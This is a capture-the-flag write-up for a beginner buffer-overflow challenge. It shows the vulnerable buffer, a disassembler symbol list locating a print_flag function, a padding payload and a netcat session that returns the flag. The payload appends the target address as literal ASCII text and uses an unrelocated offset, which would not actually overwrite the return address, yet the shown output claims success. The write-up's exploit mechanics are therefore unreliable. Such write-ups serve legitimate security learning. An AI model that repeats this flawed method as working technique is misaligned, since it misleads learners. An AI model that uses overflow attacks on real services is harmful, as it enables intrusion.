# Beginner Menu
### Category: PWN
### Difficulty: Beginner
### Author: geekgeckoalex

# Description

I just made this menu for my coding class. I think I covered all the switch cases.

# Attachments

nc Credentials, makefile, basic-menu.c, menu.

# Initial thoughts

Since this is a beginner-level pwn challenge, my assumption was that the solution is a buffer overflow, but when I looked at the .c file I got skeptical for a second because I thought its length was redundant for just a buffer overflow.
Still it turns it was a buffer overflow after all.

# Solution

if we look at the start of the main function, we see the following:

	int main(void) {
	
	// Ignore me
    	setbuf(stdout, NULL);

    	char buf[50];

	[...]
	
	}

The buffer is being initialised in the 6th line of the code snipplet above. It has size 50.
With this information we can initialise an attack. At the very top of the script we can also see the name of the function that prints the flag, so we can go ahead and get the function adress.

	0x000010f0    1 43           entry0
	0x00001120    4 41   -> 34   sym.deregister_tm_clones
	0x00001150    4 57   -> 51   sym.register_tm_clones
	0x00001190    5 57   -> 50   sym.__do_global_dtors_aux
	0x000010e0    1 6            sym.imp.__cxa_finalize
	0x000011d0    1 5            entry.init0
	0x00001000    3 23           sym._init
	0x000015a0    1 1            sym.__libc_csu_fini
	0x000015a4    1 9            sym._fini
	0x00001540    4 93           sym.__libc_csu_init	
	0x00001218   19 797          main
	**0x000011d5    1 67           sym.print_flag**
	0x000010a0    1 6            sym.imp.fopen
	0x00001070    1 6            sym.imp.fgets
	0x00001030    1 6            sym.imp.puts
	0x00001040    1 6            sym.imp.setbuf
	0x00001050    1 6            sym.imp.printf
	0x00001060    1 6            sym.imp.srand
	0x00001080    1 6            sym.imp.strcmp
	0x00001090    1 6            sym.imp.time
	0x000010b0    1 6            sym.imp.atoi
	0x000010c0    1 6            sym.imp.exit
	0x000010d0    1 6            sym.imp.rand


The sym.print_flag function is what we are looking for, and since we have the functions address now, we can overflow the buffer.

We use the information that the size is 50, and that the adress is 0x000011d5. Using pythong (or by doing it manually) we can prepare our input.

	Python command:  "A" * 50 + "B" * 8 + "0x000011d5"
	Output: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB0x000011d5'

Now we just have to paste that into the server by connecting to it using the netcat credentials in order to get the flag.

	Enter the number of the menu item you want:
	1: Hear a joke
	2: Tell you the weather
	3: Play the number guessing game
	4: Quit
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB0x000011d5
	bctf{y0u_ARe_sNeaKy}

# Flag

bctf{y0u_ARe_sNeaKy}
